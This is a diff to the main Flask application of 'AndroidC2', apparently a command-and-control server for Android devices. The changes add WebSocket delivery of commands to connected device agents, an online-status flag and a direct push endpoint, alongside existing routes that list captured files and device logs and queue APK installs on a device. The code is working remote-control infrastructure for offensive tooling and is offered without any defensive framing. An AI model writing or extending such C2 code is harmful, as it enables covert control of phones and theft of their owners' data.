@@ -1,12 +1,15 @@
 """AndroidC2 — main entry point."""
 
 import os
+from datetime import datetime
+
 from flask import Flask, render_template, jsonify, request, send_file
 from config import Config
 
 from database import init_db, db
 from c2.agent_api import agent_api
 from c2.ws_dashboard import init_socketio, socketio, broadcast
+from c2.agent_ws import register_agent_ws, send_command_to_agent, agent_online
 from c2.command_builder import COMMAND_CATALOG, build_command
 from models import Device, Command, CapturedFile, LogEntry
 
@@ -21,18 +24,31 @@ def create_app():
     init_socketio(app)
     app.register_blueprint(agent_api)
 
+    # Attach agent WebSocket namespace
+    register_agent_ws()
+
+    # ---------- UI ----------
     @app.route("/")
     def index():
         return render_template("index.html")
 
+    # ---------- Devices ----------
     @app.route("/api/devices")
     def api_devices():
         devices = Device.query.order_by(Device.last_seen.desc()).all()
-        return jsonify([d.to_dict() for d in devices])
+        result = []
+        for d in devices:
+            data = d.to_dict()
+            data["ws_online"] = agent_online(d.device_id)
+            result.append(data)
+        return jsonify(result)
 
     @app.route("/api/device/<int:dev_id>")
     def api_device(dev_id):
-        return jsonify(Device.query.get_or_404(dev_id).to_dict())
+        dev = Device.query.get_or_404(dev_id)
+        data = dev.to_dict()
+        data["ws_online"] = agent_online(dev.device_id)
+        return jsonify(data)
 
     @app.route("/api/device/<int:dev_id>", methods=["DELETE"])
     def api_delete_device(dev_id):
@@ -56,6 +72,7 @@ def create_app():
         db.session.commit()
         return jsonify(dev.to_dict())
 
+    # ---------- Commands ----------
     @app.route("/api/device/<int:dev_id>/commands")
     def api_commands(dev_id):
         cmds = (Command.query.filter_by(device_id=dev_id)
@@ -70,14 +87,28 @@ def create_app():
         args = data.get("args", {})
         if ctype not in COMMAND_CATALOG:
             return jsonify({"error": "unknown command type"}), 400
+
         cmd = build_command(dev, ctype, args)
+
+        # Try to push over WebSocket if agent is connected
+        pushed = send_command_to_agent(dev.device_id, {
+            "id": cmd.id,
+            "type": cmd.command_type,
+            "args": cmd.args(),
+        })
+        if pushed:
+            cmd.status = "sent"
+            cmd.delivered_at = datetime.utcnow()
+            db.session.commit()
+
         broadcast("new_command", cmd.to_dict())
-        return jsonify(cmd.to_dict())
+        return jsonify({"id": cmd.id, "pushed": pushed, "status": cmd.status})
 
     @app.route("/api/catalog")
     def api_catalog():
         return jsonify(COMMAND_CATALOG)
 
+    # ---------- Files ----------
     @app.route("/api/device/<int:dev_id>/files")
     def api_files(dev_id):
         files = (CapturedFile.query.filter_by(device_id=dev_id)
@@ -117,11 +148,35 @@ def create_app():
         cmd = build_command(dev, "install_apk", {"path": dest})
         return jsonify(cmd.to_dict())
 
+    # ---------- Logs ----------
     @app.route("/api/device/<int:dev_id>/logs")
     def api_logs(dev_id):
         logs = (LogEntry.query.filter_by(device_id=dev_id)
                 .order_by(LogEntry.created_at.desc()).limit(500).all())
         return jsonify([l.to_dict() for l in logs])
+
+    # ---------- Push endpoint ----------
+    @app.route("/api/device/<int:dev_id>/push", methods=["POST"])
+    def api_push_command(dev_id):
+        """Send a command directly over WebSocket (faster than poll)."""
+        dev = Device.query.get_or_404(dev_id)
+        data = request.get_json(force=True)
+        ctype = data.get("type")
+        args = data.get("args", {})
+        if ctype not in COMMAND_CATALOG:
+            return jsonify({"error": "unknown_command"}), 400
+
+        cmd = build_command(dev, ctype, args)
+        pushed = send_command_to_agent(dev.device_id, {
+            "id": cmd.id,
+            "type": cmd.command_type,
+            "args": cmd.args(),
+        })
+        if pushed:
+            cmd.status = "sent"
+            cmd.delivered_at = datetime.utcnow()
+            db.session.commit()
+        return jsonify({"id": cmd.id, "pushed": pushed, "status": cmd.status})
 
     @app.errorhandler(404)
     def nf(_):
